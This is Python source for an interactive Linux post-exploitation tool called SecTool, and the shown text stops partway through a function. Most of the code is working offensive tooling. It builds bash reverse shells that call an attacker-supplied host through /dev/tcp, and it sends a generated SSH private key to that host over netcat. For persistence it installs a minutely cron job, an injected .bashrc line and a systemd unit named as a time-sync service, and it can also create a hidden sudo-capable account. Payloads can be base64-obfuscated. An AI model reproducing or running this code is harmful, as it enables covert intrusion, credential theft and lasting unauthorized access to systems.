import os
import sys
import subprocess
import time
import uuid
import base64
import getpass
import argparse
import json
from datetime import datetime
from typing import Tuple, Optional, List, Dict
import pwd
import grp
import shutil
import socket
import string
import random
import re
from pathlib import Path

# --- Constants ---
CLEANUP_COMMENT = "# Added by SecTool for persistence"
DEFAULT_CONFIG = {
    "default_attacker_ip": "127.0.0.1",
    "default_port": 4444,
    "payload_dir": "/tmp/.sectool_tmp", # Using a hidden directory for payloads
    "ssh_key_dir": os.path.expanduser("~/.ssh"),
    "exfil_timeout": 120,
    "retry_count": 3,
    "retry_delay": 2,
    "obfuscate_payload": False,
}

# --- Utility Functions ---
def validate_ip(ip: str) -> bool:
    """Validates if the given string is a valid IP address."""
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def validate_port(port: int) -> bool:
    """Validates if the given number is a valid port."""
    return 1 <= port <= 65535

def sanitize_input(input_str: str) -> str:
    """Removes potentially harmful characters from a string."""
    return re.sub(r'[^\w\s@./-]', '', input_str).strip()

def run_command(command: str | List[str], shell: bool = False, check: bool = False,
                capture_output: bool = True, timeout: int = 60,
                input_data: Optional[str] = None, retries: int = 0) -> Tuple[str, str, int]:
    """
    Executes a system command with retries, timeout, and error handling.
    Returns (stdout, stderr, returncode).
    """
    if isinstance(command, list) and shell:
        command = ' '.join(command)
    elif isinstance(command, str) and not shell:
        command = command.split()

    for attempt in range(retries + 1):
        try:
            result = subprocess.run(
                command,
                shell=shell,
                check=check,
                capture_output=capture_output,
                text=True,
                timeout=timeout,
                input=input_data
            )
            return result.stdout.strip(), result.stderr.strip(), result.returncode
        except subprocess.CalledProcessError as e:
            print_error(f"Command failed (Attempt {attempt + 1}/{retries + 1}): {e.cmd} -> {e.returncode}\nSTDOUT: {e.stdout}\nSTDERR: {e.stderr}")
            if attempt < retries:
                time.sleep(config.get("retry_delay", 2))
            else:
                return e.stdout.strip(), e.stderr.strip(), e.returncode
        except subprocess.TimeoutExpired:
            print_error(f"Command timed out after {timeout} seconds (Attempt {attempt + 1}/{retries + 1})")
            if attempt < retries:
                time.sleep(config.get("retry_delay", 2))
            else:
                return "", f"Command timed out after {timeout} seconds.", 1
        except FileNotFoundError:
            cmd_str = command[0] if isinstance(command, list) else command
            print_error(f"Command not found: {cmd_str} (Attempt {attempt + 1}/{retries + 1})")
            return "", f"Command not found: {cmd_str}.", 1
        except Exception as e:
            print_error(f"Unexpected error (Attempt {attempt + 1}/{retries + 1}): {e}")
            if attempt < retries:
                time.sleep(config.get("retry_delay", 2))
            else:
                return "", str(e), 1
    return "", "Unknown error after retries.", 1

def print_section_header(title: str):
    """Prints a formatted section header."""
    print(f"\n{'='*3} {title} {'='*3}")

def print_info(message: str):
    """Prints an informational message."""
    print(message)

def print_success(message: str):
    """Prints a success message."""
    print(f"[SUCCESS] {message}")

def print_warning(message: str):
    """Prints a warning message."""
    print(f"[WARNING] {message}")

def print_error(message: str):
    """Prints an error message."""
    print(f"[ERROR] {message}")

def print_stealth_tip(message: str):
    """Prints a stealth tip."""
    print(f"[STEALTH TIP] {message}")

# --- Configuration Management ---
def load_config(config_path: str = "sectool_config.json") -> Dict:
    """Loads a JSON configuration file, falling back to defaults."""
    config = DEFAULT_CONFIG.copy()
    if os.path.exists(config_path):
        try:
            with open(config_path, "r") as f:
                loaded_config = json.load(f)
            config.update({k: v for k, v in loaded_config.items() if v is not None})
            print_info(f"Loaded configuration from {config_path}")
        except Exception as e:
            print_error(f"Error loading config: {e}")
    
    # Ensure the payload directory exists with secure permissions
    Path(config["payload_dir"]).mkdir(mode=0o700, exist_ok=True)
    return config

# --- Payload and SSH Key Generator ---
def obfuscate_payload(payload_content: str) -> str:
    """Obfuscates a payload using base64 encoding and a bash wrapper."""
    encoded_payload = base64.b64encode(payload_content.encode()).decode()
    return f"""#!/bin/bash
# Obfuscated payload
echo '{encoded_payload}' | base64 -d | /bin/bash
"""

def create_payload_script(target_ip: Optional[str], port: int, payload_type: str = "bash_reverse") -> Optional[str]:
    """Creates a customizable reverse shell payload script."""
    if not validate_port(port):
        print_error("Invalid port for payload creation.")
        return None

    # Currently only supports bash reverse shell
    payload_templates = {
        "bash_reverse": f"""#!/bin/bash
# Reverse shell payload
exec 5<>/dev/tcp/{target_ip}/{port}
cat <&5 | while read line; do $line 2>&5 >&5; done
"""
    }
    
    if payload_type != "bash_reverse":
        print_warning(f"Payload type '{payload_type}' is not supported. Defaulting to 'bash_reverse'.")
        payload_type = "bash_reverse"

    payload_content = payload_templates.get(payload_type)
    
    if config.get("obfuscate_payload", False):
        payload_content = obfuscate_payload(payload_content)

    payload_path = os.path.join(config["payload_dir"], f"payload_{uuid.uuid4().hex[:8]}.sh")
    try:
        with open(payload_path, "w") as f:
            f.write(payload_content)
        os.chmod(payload_path, 0o755)
        print_success(f"Created {payload_type} payload at {payload_path} for {target_ip}:{port}")
        return payload_path
    except Exception as e:
        print_error(f"Error creating payload: {e}")
        return None

def generate_ssh_key(key_type: str = "rsa", key_size: int = 2048) -> Tuple[Optional[str], Optional[str]]:
    """Generates a new SSH key pair in a temporary directory."""
    temp_key_dir = os.path.join(config["payload_dir"], f".ssh_temp_{uuid.uuid4().hex[:8]}")
    os.makedirs(temp_key_dir, mode=0o700, exist_ok=True)
    
    key_name = f"sectool_key_{uuid.uuid4().hex[:8]}"
    key_path = os.path.join(temp_key_dir, key_name)
    pub_key_path = f"{key_path}.pub"
    
    try:
        stdout, stderr, returncode = run_command(
            ["ssh-keygen", "-t", key_type, "-b", str(key_size), "-f", key_path, "-N", "", "-C", "sectool@tool"],
            retries=config.get("retry_count", 0)
        )
        if returncode != 0:
            print_error(f"Error generating SSH key: {stderr}")
            shutil.rmtree(temp_key_dir)
            return None, None
        
        print_success(f"Generated {key_type} SSH key pair: {key_path}, {pub_key_path}")
        return key_path, pub_key_path
    except Exception as e:
        print_error(f"Error generating SSH key: {e}")
        if os.path.exists(temp_key_dir):
            shutil.rmtree(temp_key_dir)
        return None, None

# --- Persistence Techniques ---
def linux_persistence_menu():
    """Displays the menu for Linux persistence techniques."""
    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        print_section_header("Linux Persistence Techniques")
        print("1. SSH Authorized Keys (T1098.004)")
        print("2. Cron Job (T1053.003)")
        print("3. Unix Shell Configuration Modification (T1546.004) - .bashrc")
        print("4. Systemd Service (T1543.002)")
        print("5. Establish Reverse Shell (Direct)")
        print("b. Back to Main Menu")
        choice = input("Choose an option: ").lower()
        if choice == "1":
            ssh_authorized_keys()
        elif choice == "2":
            cron_job_management()
        elif choice == "3":
            unix_shell_config_modification()
        elif choice == "4":
            systemd_service_persistence()
        elif choice == "5":
            establish_reverse_shell_direct()
        elif choice == "b":
            break
        else:
            print_warning("Invalid choice.")
        input("\nPress Enter to continue...")

def ssh_authorized_keys():
    """Generates an SSH key, adds it to a user's authorized_keys, and exfiltrates the private key."""
    print_section_header("SSH Authorized Keys Persistence & Exfiltration")
    print_info("This technique generates an SSH key pair on this target machine, adds the public key to")
    print_info("the specified user's authorized_keys, and then attempts to send the private key")
    print_info("back to your attacking machine for easy re-entry.")
    print_warning("Requires root privileges if modifying another user's ~/.ssh/ or if current user lacks write access.")

    target_username = sanitize_input(input(f"Enter target username (user on THIS machine, default: {os.getlogin()}): ").strip() or os.getlogin())
    
    attacker_listener_ip = input(f"Enter your ATTACKING MACHINE'S IP (default: {config['default_attacker_ip']}): ").strip() or config['default_attacker_ip']
    if not validate_ip(attacker_listener_ip):
        print_error("Invalid Attacker IP.")
        return

    listener_port_str = input(f"Enter the PORT your ATTACKING MACHINE will listen on (default: {config['default_port']}): ").strip() or str(config['default_port'])
    try:
        listener_port = int(listener_port_str)
        if not validate_port(listener_port):
            raise ValueError("Port must be between 1 and 65535.")
    except ValueError as e:
        print_error(f"Invalid port number: {e}")
        return

    key_type = input("Enter SSH key type (rsa/ed25519, default: rsa): ").strip() or "rsa"
    key_size = 2048 if key_type == "rsa" else 256 # Default for ed25519

    key_path, pub_key_path = generate_ssh_key(key_type, key_size)
    if not key_path or not pub_key_path:
        return

    try:
        with open(pub_key_path, "r") as f:
            pub_key_content = f.read().strip()
        
        try:
            target_user_info = pwd.getpwnam(target_username)
            target_user_home = target_user_info.pw_dir
            target_user_uid = target_user_info.pw_uid
            target_user_gid = target_user_info.pw_gid
        except KeyError:
            print_error(f"User '{target_username}' not found on this system.")
            shutil.rmtree(os.path.dirname(key_path))
            return

        ssh_dir = os.path.join(target_user_home, ".ssh")
        auth_keys_file = os.path.join(ssh_dir, "authorized_keys")

        # Create and set permissions for .ssh directory if it doesn't exist
        if not os.path.exists(ssh_dir):
            print_info(f"Creating directory: {ssh_dir} for user {target_username}")
            if os.geteuid() != 0 and target_username != os.getlogin():
                print_warning(f"This requires sudo. You may be prompted for your sudo password.")
                run_command(["sudo", "mkdir", "-p", ssh_dir])
                run_command(["sudo", "chown", f"{target_username}:{target_username}", ssh_dir])
                run_command(["sudo", "chmod", "700", ssh_dir])
            else:
                os.makedirs(ssh_dir, mode=0o700, exist_ok=True)
                os.chown(ssh_dir, target_user_uid, target_user_gid)

        print_info(f"Adding public key to {auth_keys_file}...")
        # Add key and set permissions for authorized_keys file
        if os.geteuid() != 0 and target_username != os.getlogin():
            print_warning(f"This requires sudo to write to {auth_keys_file}.")
            run_command(["sudo", "tee", "-a", auth_keys_file], input_data=f"\n{CLEANUP_COMMENT}\n{pub_key_content}\n")
            run_command(["sudo", "chown", f"{target_username}:{target_username}", auth_keys_file])
            run_command(["sudo", "chmod", "600", auth_keys_file])
        else:
            with open(auth_keys_file, "a") as f:
                f.write(f"\n{CLEANUP_COMMENT}\n{pub_key_content}\n")
            os.chown(auth_keys_file, target_user_uid, target_user_gid)
            os.chmod(auth_keys_file, 0o600)
        
        print_success(f"Public key added to {auth_keys_file} for user '{target_username}'.")

        # Exfiltration section
        print_section_header("Private Key Exfiltration")
        print_info(f"On your ATTACKING MACHINE, set up a listener to receive the private key:")
        print_info(f"  nc -lvnp {listener_port} > received_sectool_key.pem")
        
        confirm_exfil = input(f"Press Enter when your listener is ready on {attacker_listener_ip}:{listener_port}... (or 'n' to skip exfil): ").lower()
        if confirm_exfil != 'n':
            print_info(f"Attempting to send private key '{os.path.basename(key_path)}' to {attacker_listener_ip}:{listener_port}...")
            stdout, stderr, returncode = run_command(
                f"cat {key_path} | nc -w 5 {attacker_listener_ip} {listener_port}",
                shell=True, timeout=15
            )
            if returncode == 0:
                print_success("Private key sent via Netcat.")
            else:
                print_error(f"Netcat failed ({stderr}). Manual exfiltration required.")

        print_section_header("Re-entry Instructions")
        print_info(f"Once the private key is on your attacking machine (e.g., saved as 'received_sectool_key.pem'):")
        print_info(f"1. Set correct permissions: chmod 600 received_sectool_key.pem")
        target_ip_guess = os.getenv('SSH_CLIENT', 'TARGET_IP ').split(' ')[0]
        print_info(f"2. Connect via SSH: ssh -i received_sectool_key.pem {target_username}@{target_ip_guess}")
        
    except Exception as e:
        print_error(f"An unexpected error occurred during SSH key persistence: {e}")
    finally:
        # Cleanup temporary key files from the target
        if os.path.exists(os.path.dirname(key_path)):
            print_info(f"Cleaning up temporary SSH key files from {os.path.dirname(key_path)}...")
            shutil.rmtree(os.path.dirname(key_path))
            print_success("Temporary SSH key files removed from target.")

def cron_job_management():
    """Displays the menu for cron job management."""
    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        print_section_header("Linux Cron Job Management")
        print("1. List Current User's Cron Jobs")
        print("2. Add Cron Job (Reverse Shell)")
        print("b. Back to Linux Persistence Menu")
        choice = input("Choose an option: ").lower()
        if choice == "1":
            list_linux_cron_jobs()
        elif choice == "2":
            add_linux_cron_job_auto()
        elif choice == "b":
            break
        else:
            print_warning("Invalid choice.")
        input("\nPress Enter to continue...")

def list_linux_cron_jobs():
    """Lists the current user's cron jobs."""
    print_info("Listing current user's cron jobs:")
    stdout, stderr, returncode = run_command(["crontab", "-l"])
    if returncode == 0:
        print("\n--- Current User Crontab ---")
        print(stdout or "No cron jobs found for current user.")
        print("----------------------------")
    else:
        # A non-zero return code often just means no crontab file exists, which is not an error.
        print_info("No cron jobs found for current user.")

def add_linux_cron_job_auto():
    """Adds a reverse shell cron job that runs every minute."""
    print_section_header("Add Cron Job (Reverse Shell)")
    attacker_ip = input(f"Enter attacker IP (default: {config['default_attacker_ip']}): ").strip() or config['default_attacker_ip']
    port_str = input(f"Enter port (default: {config['default_port']}): ").strip() or str(config['default_port'])
    try:
        port = int(port_str)
        if not validate_port(port):
            raise ValueError("Port must be between 1 and 65535.")
    except ValueError as e:
        print_error(f"Invalid port number: {e}")
        return

    payload_path = create_payload_script(attacker_ip, port, "bash_reverse")
    if not payload_path:
        return
    
    interval = "* * * * *" # Every minute
    command = f"/bin/bash {payload_path} >/dev/null 2>&1"

    try:
        stdout, stderr, returncode = run_command(["crontab", "-l"])
        current_crontab = stdout if returncode == 0 else ""
        # Embed the cleanup comment in the same line as the command
        new_crontab = f"{current_crontab.strip()}\n{interval} {command} {CLEANUP_COMMENT}\n"
        
        stdout, stderr, returncode = run_command(["crontab", "-"], input_data=new_crontab)
        if returncode == 0:
            print_success(f"Added cron job: '{command}' to run every minute.")
            print_info(f"Start a listener on {attacker_ip}:{port} (e.g., 'nc -lvnp {port}').")
        else:
            print_error(f"Error adding cron job: {stderr}")
    except Exception as e:
        print_error(f"An unexpected error occurred: {e}")

def unix_shell_config_modification():
    """Adds a reverse shell command to a user's .bashrc file."""
    print_section_header("Unix Shell Configuration Modification (.bashrc)")
    print_info("This adds a reverse shell command to a user's ~/.bashrc file.")
    print_info("The command will execute in the background when a new interactive bash shell is started.")
    print_warning("Requires write access to the target user's home directory. If targeting another user, requires root.")

    target_username = sanitize_input(input(f"Enter target username (default: {os.getlogin()}): ").strip() or os.getlogin())
    
    attacker_ip = input(f"Enter your ATTACKING MACHINE'S IP (default: {config['default_attacker_ip']}): ").strip() or config['default_attacker_ip']
    if not validate_ip(attacker_ip):
        print_error("Invalid Attacker IP.")
        return

    listener_port_str = input(f"Enter the PORT your listener is on (default: {config['default_port']}): ").strip() or str(config['default_port'])
    try:
        listener_port = int(listener_port_str)
        if not validate_port(listener_port):
            raise ValueError("Port must be between 1 and 65535.")
    except ValueError as e:
        print_error(f"Invalid port number: {e}")
        return

    try:
        target_user_home = pwd.getpwnam(target_username).pw_dir
    except KeyError:
        print_error(f"User '{target_username}' not found on this system.")
        return

    bashrc_path = os.path.join(target_user_home, ".bashrc")
    # This command runs in a subshell and in the background (&) so it doesn't hijack the user's terminal.
    command_to_add = f"(bash -i >& /dev/tcp/{attacker_ip}/{listener_port} 0>&1 &) {CLEANUP_COMMENT}"

    try:
        if os.geteuid() != 0 and target_username != os.getlogin():
            print_warning(f"This requires sudo to modify {bashrc_path}. You may be prompted for your sudo password.")
            run_command(["sudo", "tee", "-a", bashrc_path], input_data=f"\n{command_to_add}\n")
        else:
            with open(bashrc_path, "a") as f:
                f.write(f"\n{command_to_add}\n")
        
        print_success(f"Added stealthy reverse shell command to {bashrc_path} for user '{target_username}'.")
        print_info(f"Start a listener on your ATTACKING MACHINE: nc -lvnp {listener_port}")
        print_info(f"The shell will connect when user '{target_username}' next starts an interactive bash session.")
    except Exception as e:
        print_error(f"An unexpected error occurred: {e}")

def systemd_service_persistence():
    """Creates a systemd service to run a reverse shell on boot."""
    print_section_header("Systemd Service Persistence (T1543.002)")
    print_info("This creates a systemd service that runs a reverse shell on boot.")
    print_warning("Requires root privileges. You will be prompted for your sudo password.")

    attacker_ip = input(f"Enter your ATTACKING MACHINE'S IP (default: {config['default_attacker_ip']}): ").strip() or config['default_attacker_ip']
    if not validate_ip(attacker_ip):
        print_error("Invalid Attacker IP.")
        return

    listener_port_str = input(f"Enter the PORT your listener is on (default: {config['default_port']}): ").strip() or str(config['default_port'])
    try:
        listener_port = int(listener_port_str)
        if not validate_port(listener_port):
            raise ValueError("Port must be between 1 and 65535.")
    except ValueError as e:
        print_error(f"Invalid port number: {e}")
        return

    service_name = f"network-updater-{uuid.uuid4().hex[:4]}.service"
    service_file_path = f"/etc/systemd/system/{service_name}"
    rev_shell_command = f"/bin/bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{listener_port} 0>&1'"

    service_content = f"""
[Unit]
Description=Network Time Synchronization Service {CLEANUP_COMMENT}
After=network.target

[Service]
Type=simple
ExecStart={rev_shell_command}
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
"""
    try:
        print_info(f"Creating systemd service file: {service_file_path}")
        stdout, stderr, returncode = run_command(
            ["sudo", "tee", service_file_path], input_data=service_content
        )
        if returncode != 0:
            print_error(f"Failed to create service file: {stderr}")
            return

        print_info("Reloading systemd daemon...")
        run_command(["sudo", "systemctl", "daemon-reload"])

        print_info(f"Enabling and starting service '{service_name}'...")
        stdout, stderr, returncode = run_command(["sudo", "systemctl", "enable", "--now", service_name])
        if returncode == 0:
            print_success(f"Systemd service '{service_name}' created and started successfully.")
            print_info(f"Start a listener on your machine: nc -lvnp {listener_port}")
            print_info(f"To cleanup later, use the cleanup menu with service name: {service_name}")
        else:
            print_error(f"Failed to enable/start service: {stderr}")
            print_info("Attempting to cleanup failed service file...")
            run_command(["sudo", "rm", "-f", service_file_path])

    except Exception as e:
        print_error(f"An unexpected error occurred: {e}")

def establish_reverse_shell_direct():
    """Creates and immediately executes a temporary reverse shell payload."""
    print_section_header("Establish Reverse Shell (Direct)")
    print_info("This will create and execute a temporary reverse shell payload.")
    print_warning("The payload script will be removed immediately after execution attempt.")

    attacker_ip = input(f"Enter your ATTACKING MACHINE'S IP (default: {config['default_attacker_ip']}): ").strip() or config['default_attacker_ip']
    if not validate_ip(attacker_ip):
        print_error("Invalid Attacker IP.")
        return

    listener_port_str = input(f"Enter the PORT your listener is on (default: {config['default_port']}): ").strip() or str(config['default_port'])
    try:
        listener_port = int(listener_port_str)
        if not validate_port(listener_port):
            raise ValueError("Port must be between 1 and 65535.")
    except ValueError as e:
        print_error(f"Invalid port number: {e}")
        return

    payload_path = create_payload_script(attacker_ip, listener_port, "bash_reverse")
    if not payload_path:
        return

    print_info(f"On your ATTACKING MACHINE, set up a listener: nc -lvnp {listener_port}")
    
    confirm_shell = input("Press Enter when your listener is ready... (or 'n' to cancel): ").lower()
    if confirm_shell == 'n':
        print_warning("Reverse shell execution cancelled.")
    else:
        print_info(f"Attempting to execute reverse shell from {payload_path}...")
        # Execute without waiting for it to finish, as it will hang
        try:
            subprocess.Popen([f"/bin/bash", payload_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print_success("Reverse shell command executed (check your listener!).")
        except Exception as e:
            print_error(f"Failed to launch reverse shell process: {e}")
    
    # Cleanup the payload script regardless of execution success
    try:
        time.sleep(1) # Give it a moment to launch
        os.remove(payload_path)
        print_success(f"Cleaned up temporary payload: {payload_path}")
    except Exception as e:
        print_error(f"Error cleaning up temporary payload: {e}")

# --- Privilege Escalation ---
def linux_privesc_menu():
    """Displays the menu for Linux privilege escalation techniques."""
    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        print_section_header("Linux Privilege Escalation Techniques")
        print("1. SUID/SGID Binary Enumeration (T1548.001)")
        print("2. Sudo Misconfiguration Enumeration (T1548.003)")
        print("3. Add Current User to Sudo Group (T1098)")
        print("4. Create Privileged Local Account (T1136.001)")
        print("5. Kernel Exploit Enumeration")
        print("b. Back to Main Menu")

        choice = input("Choose an option: ").lower()
        if choice == "1":
            find_suid_sgid_binaries()
        elif choice == "2":
            enumerate_sudo_misconfigurations()
        elif choice == "3":
            add_user_to_sudo_group_auto()
        elif choice == "4":
            create_privileged_local_account_auto()
        elif choice == "5":
            kernel_exploit_enumeration()
        elif choice == "b":
            break
        else:
            print_warning("Invalid choice.")
        input("\nPress Enter to continue...")

def find_suid_sgid_binaries():
    """Finds SUID and SGID binaries on the system."""
    print_section_header("SUID/SGID Binary Enumeration")
    print_info("Searching for binaries that may be exploitable for privilege escalation.")
    print_stealth_tip("This is a passive enumeration. The risk increases when attempting to exploit identified binaries.")

    suid_command = "find / -perm -4000 -type f 2>/dev/null"
    sgid_command = "find / -perm -2000 -type f 2>/dev/null"

    print_info("Searching for SUID files...")
    stdout_suid, stderr_suid, _ = run_command(suid_command, shell=True, timeout=180)
    if stdout_suid:
        print("\n--- SUID Files Found ---")
        print(stdout_suid)
        print("------------------------")
    else:
        print_info("No SUID files found.")

    print_info("Searching for SGID files...")
    stdout_sgid, stderr_sgid, _ = run_command(sgid_command, shell=True, timeout=180)
    if stdout_sgid:
        print("\n--- SGID Files Found ---")
        print(stdout_sgid)
        print("------------------------")
    else:
        print_info("No SGID files found.")

    print_warning("Refer to GTFOBins (gtfobins.github.io) for potential exploitation methods.")

def enumerate_sudo_misconfigurations():
    """Checks what commands the current user can run with sudo."""
    print_section_header("Sudo Misconfiguration Enumeration")
    print_info("Checking 'sudo -l' for passwordless sudo commands or other misconfigurations.")
    stdout, stderr, returncode = run_command(["sudo", "-l"], check=False)
    if returncode == 0:
        print("\n--- Sudo Permissions for Current User ---")
        print(stdout)
        print("-----------------------------------------")
        if "(ALL : ALL) ALL" in stdout or "(ALL) ALL" in stdout:
            print_warning("User has unrestricted sudo access!")
        if "NOPASSWD:" in stdout:
            print_warning("User has passwordless sudo commands! These can be used for easy privilege escalation.")
    else:
        print_error(f"Could not execute 'sudo -l': {stderr}")

def add_user_to_sudo_group_auto():
    """Adds the current user to a common sudo group."""
    print_section_header("Add Current User to Sudo Group")
    print_warning("Requires root privileges.")
    current_user = os.getlogin()
    sudo_groups = ["sudo", "wheel", "admin"]
    target_group = next((g for g in sudo_groups if run_command(["getent", "group", g])[2] == 0), None)
    if not target_group:
        print_error("No common sudo group (sudo, wheel, admin) found.")
        return
    
    print_info(f"Attempting to add user '{current_user}' to group '{target_group}'...")
    stdout, stderr, returncode = run_command(["sudo", "usermod", "-aG", target_group, current_user])
    if returncode == 0:
        print_success(f"Added '{current_user}' to '{target_group}' group.")
        print_info("User will need to log out and log back in for changes to take effect.")
    else:
        print_error(f"Error adding user to group: {stderr}")

def create_privileged_local_account_auto():
    """Creates a new local user and adds it to a sudo group."""
    print_section_header("Create New Privileged Local Account")
    print_warning("Requires root privileges.")
    username = f"svc-admin-{uuid.uuid4().hex[:4]}"
    password = ''.join(random.choice(string.ascii_letters + string.digits + "!@#$%^&*()") for i in range(16))

    sudo_groups = ["sudo", "wheel", "admin"]
    target_group = next((g for g in sudo_groups if run_command(["getent", "group", g])[2] == 0), None)
    if not target_group:
        print_error("No common sudo group (sudo, wheel, admin) found.")
        return
    
    try:
        print_info(f"Creating user '{username}'...")
        stdout, stderr, returncode = run_command(["sudo", "useradd", "-m", "-s", "/bin/bash", username])
        if returncode != 0:
            print_error(f"Error creating user: {stderr}")
            return

        print_info(f"Setting password for '{username}'...")
        run_command(["sudo", "chpasswd"], input_data=f"{username}:{password}", shell=False)

        print_info(f"Adding '{username}' to '{target_group}' group...")
        run_command(["sudo", "usermod", "-aG", target_group, username])

        print_success(f"Created privileged user. SAVE THESE CREDENTIALS:")
        print(f"  Username: {username}")
        print(f"  Password: {password}")
    except Exception as e:
        print_error(f"An unexpected error occurred: {e}")

def kernel_exploit_enumeration():
    """Displays kernel version to aid in finding exploits."""
    print_section_header("Kernel Exploit Enumeration")
    stdout, stderr, returncode = run_command(["uname", "-a"])
    if returncode == 0:
        print_info(f"System Info: {stdout}")
        print_info("\nSuggested tools for exploit enumeration:")
        print_info("- Linux Exploit Suggester: https://github.com/mzet-/linux-exploit-suggester")
        print_info("- LinPEAS: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS")
        print_info("- Search CVE databases for known vulnerabilities for the kernel version.")
    else:
        print_error(f"Error retrieving kernel version: {stderr}")

# --- Cleanup Functions ---
def cleanup_menu():
    """Displays the menu for cleanup and reversion tasks."""
    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        print_section_header("Cleanup / Revert Mechanisms (Linux)")
        print("1. Revert SSH Authorized Keys")
        print("2. Revert Cron Jobs")
        print("3. Revert Systemd Service")
        print("4. Revert Unix Shell Configuration Modifications (.bashrc)")
        print("5. Remove Privileged Local Account")
        print("6. Cleanup All Payloads (from payload_dir)")
        print("b. Back to Main Menu")
        choice = input("Choose an option: ").lower()
        if choice == "1":
            revert_ssh_authorized_keys()
        elif choice == "2":
            revert_cron_jobs()
        elif choice == "3":
            revert_systemd_service()
        elif choice == "4":
            revert_unix_shell_config_modification()
        elif choice == "5":
            remove_privileged_local_account()
        elif choice == "6":
            cleanup_all_payloads()
        elif choice == "b":
            break
        else:
            print_warning("Invalid choice.")
        input("\nPress Enter to continue...")

def revert_file_content(file_path: str, username: str):
    """Generic function to remove lines with CLEANUP_COMMENT from a file."""
    if not os.path.exists(file_path):
        print_info(f"File '{file_path}' not found. Nothing to revert.")
        return
    try:
        is_sudo_needed = os.geteuid() != 0 and username != os.getlogin()
        
        if is_sudo_needed:
            print_warning(f"Reading {file_path} for user {username} may require sudo.")
            stdout, _, returncode = run_command(["sudo", "cat", file_path])
            if returncode != 0: return
            lines = stdout.splitlines(keepends=True)
        else:
            with open(file_path, "r") as f:
                lines = f.readlines()
        
        original_line_count = len(lines)
        new_lines = [line for line in lines if CLEANUP_COMMENT not in line]

        if len(new_lines) == original_line_count:
            print_info(f"No tool-added entries found in {file_path}.")
            return

        if is_sudo_needed:
            print_warning(f"Writing to {file_path} for user {username} may require sudo.")
            run_command(["sudo", "tee", file_path], input_data="".join(new_lines), shell=False)
        else:
            with open(file_path, "w") as f:
                f.writelines(new_lines)
        
        print_success(f"Removed tool entries from {file_path}.")
    except Exception as e:
        print_error(f"Error reverting file {file_path}: {e}")

def revert_ssh_authorized_keys():
    """Removes the tool's SSH keys from a user's authorized_keys."""
    print_section_header("Reverting SSH Authorized Keys")
    username = sanitize_input(input(f"Enter target username (default: {os.getlogin()}): ").strip() or os.getlogin())
    try:
        target_user_home = pwd.getpwnam(username).pw_dir
        auth_keys_file = os.path.join(target_user_home, ".ssh", "authorized_keys")
        revert_file_content(auth_keys_file, username)
    except KeyError:
        print_error(f"User '{username}' not found on this system.")

def revert_cron_jobs():
    """Removes the tool's cron jobs for the current user."""
    print_section_header("Reverting Cron Jobs")
    try:
        stdout, _, returncode = run_command(["crontab", "-l"])
        if returncode != 0:
            print_info("No crontab for current user. Nothing to do.")
            return
        
        current_crontab_lines = stdout.splitlines()
        new_crontab_lines = [line for line in current_crontab_lines if CLEANUP_COMMENT not in line]
        
        if len(new_crontab_lines) == len(current_crontab_lines):
            print_info("No tool-added cron jobs found.")
            return

        new_crontab_content = "\n".join(new_crontab_lines)

        if not new_crontab_content.strip():
            print_info("Crontab is empty after cleanup. Removing crontab file.")
            run_command(["crontab", "-r"])
        else:
            run_command(["crontab", "-"], input_data=new_crontab_content + "\n")
        
        print_success("Removed tool-added cron jobs.")
    except Exception as e:
        print_error(f"An unexpected error occurred: {e}")

def revert_systemd_service():
    """Stops, disables, and removes a systemd service."""
    print_section_header("Reverting Systemd Service")
    print_warning("Requires root privileges.")
    
    service_pattern = input(f"Enter service name/pattern to remove (e.g., 'network-updater-*.service'): ").strip()
    if not service_pattern:
        print_error("Service name/pattern cannot be empty.")
        return

    try:
        # Use a shell to expand the wildcard
        find_cmd = f"sudo find /etc/systemd/system/ -name '{service_pattern}'"
        stdout, stderr, returncode = run_command(find_cmd, shell=True)

        if returncode != 0 or not stdout:
            print_info(f"No services found matching pattern: {service_pattern}")
            return
        
        found_services = [os.path.basename(s) for s in stdout.strip().split('\n')]
        print_info(f"Found services to remove: {', '.join(found_services)}")

        for service_name in found_services:
            print_info(f"Stopping and disabling service '{service_name}'...")
            run_command(["sudo", "systemctl", "stop", service_name])
            run_command(["sudo", "systemctl", "disable", service_name])
            
            service_path = os.path.join("/etc/systemd/system", service_name)
            print_info(f"Removing service file '{service_path}'...")
            run_command(["sudo", "rm", "-f", service_path])
        
        print_info("Reloading systemd daemon to apply changes...")
        run_command(["sudo", "systemctl", "daemon-reload"])
        
        print_success(f"Successfully reverted and removed services matching '{service_pattern}'.")
    except Exception as e:
        print_error(f"An error occurred during cleanup: {e}")

def revert_unix_shell_config_modification():
    """Removes the tool's entries from a user's .bashrc."""
    print_section_header("Reverting Unix Shell Configuration Modifications (.bashrc)")
    username = sanitize_input(input(f"Enter target username (default: {os.getlogin()}): ").strip() or os.getlogin())
    try:
        target_user_home = pwd.getpwnam(username).pw_dir
        bashrc_path = os.path.join(target_user_home, ".bashrc")
        revert_file_content(bashrc_path, username)
    except KeyError:
        print_error(f"User '{username}' not found on this system.")

def remove_privileged_local_account():
    """Removes a local user account."""
    print_section_header("Remove Privileged Local Account")
    print_warning("Requires root privileges.")
    username = sanitize_input(input("Enter the username of the account to remove: ").strip())

    if not username:
        print_error("Username cannot be empty. Operation cancelled.")
        return
    
    confirm = input(f"Are you sure you want to PERMANENTLY remove user '{username}' and their home directory? (y/N): ").lower()
    if confirm != 'y':
        print_info("Operation cancelled.")
        return

    try:
        print_info(f"Attempting to remove user '{username}'...")
        stdout, stderr, returncode = run_command(["sudo", "userdel", "-r", username])
        if returncode == 0:
            print_success(f"Successfully removed user '{username}' and their home directory.")
        elif "does not exist" in stderr:
            print_warning(f"User '{username}' does not exist. Nothing to remove.")
        else:
            print_error(f"Error removing user: {stderr}")
    except Exception as e:
        print_error(f"An unexpected error occurred: {e}")

def cleanup_all_payloads():
    """Removes all temporary payloads and SSH keys created by the tool."""
    print_section_header("Cleanup All Payloads")
    payload_dir = config["payload_dir"]
    print_warning(f"This will attempt to remove the entire payload directory: {payload_dir}.")
    confirm = input("Are you sure you want to proceed? (y/N): ").lower()
    if confirm != 'y':
        print_info("Operation cancelled.")
        return

    try:
